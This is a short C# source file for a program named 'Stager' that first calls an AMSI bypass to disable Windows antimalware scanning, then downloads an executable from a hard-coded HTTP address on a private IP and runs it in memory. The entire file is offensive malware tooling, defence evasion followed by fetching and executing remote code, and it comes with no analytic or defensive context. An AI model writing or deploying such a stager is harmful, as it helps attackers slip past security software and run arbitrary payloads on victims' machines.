using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Stager
{
    class Program
    {
        static void Main(string[] args)
        {
            AMSIBypass.Patch();
            string sAssemblyURL = "http://192.168.202.1:80/Test.exe";//hash
            Uri URL = new Uri(sAssemblyURL);
            byte[] pAssemblyBuff = Commons.HttpGet(URL);
            Assembly.AssemblyExecute(pAssemblyBuff);
        }
    }
}
